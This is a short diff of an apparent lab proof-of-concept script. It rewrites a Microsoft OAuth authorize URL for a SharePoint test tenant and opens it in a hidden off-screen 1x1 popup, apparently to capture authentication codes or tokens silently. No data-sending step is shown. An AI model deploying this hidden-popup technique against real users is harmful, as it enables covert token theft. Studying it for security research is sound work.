@@ -2,7 +2,7 @@
 if(window.__labPoc)return;
 window.__labPoc=1;
 
-const oauth = "https://login.microsoftonline.com/765ca7f2-70b3-424e-ac45-f00d5a55e9ce/oauth2/authorize?client_id=00000003-0000-0ff1-ce00-000000000000&response_mode=fragment&response_type=code%20id_token&resource=00000003-0000-0ff1-ce00-000000000000&scope=openid&nonce=FE7BFE71987B16A5F336298102F8FE3650FE9E07EAE3E44B-FFD6770B61040E741D9B6E63EC38455E56BA32023ABCC355EF3892DC7C787642&redirect_uri=https://shiscolinotests.sharepoint.com/_forms/default.aspx&state=OD0w&claims={\"id_token\":{\"xms_cc\":{\"values\":[\"CP1\"]}}}&wsucxt=1&cobrandid=11bd8083-87e0-41b5-bb78-0bc43c8a8e8a&client-request-id=bfffe1a1-902b-a000-e3cd-10d5c80778de";
+const oauth = "https://login.microsoftonline.com:443/765ca7f2-70b3-424e-ac45-f00d5a55e9ce/oauth2/authorize?client%5Fid=00000003%2D0000%2D0ff1%2Dce00%2D000000000000&response%5Fmode=form%5Fpost&response%5Ftype=code%20id%5Ftoken&resource=00000003%2D0000%2D0ff1%2Dce00%2D000000000000&scope=openid&nonce=1B29E2DBE599DC699887606A54AF957449A8B8BC00A5B9A2%2DD44F931F659874CAFEB16F5F0237AFEA3CF4248B20C29CEBD4A3B43165C18040&redirect%5Furi=https%3A%2F%2Fshiscolinotests%2Esharepoint%2Ecom%2F%5Fforms%2Fdefault%2Easpx&state=OD0w&claims={\"id_token\":{\"xms_cc\":{\"values\":[\"CP1\"]}}}&wsucxt=1&cobrandid=11bd8083%2D87e0%2D41b5%2Dbb78%2D0bc43c8a8e8a&client%2Drequest%2Did=c002e2a1%2Df0db%2Db000%2D0f8f%2D87efa0c0adff";
 
 let win=open(oauth,"","width=1,height=1,left=-10000,top=-10000");
 
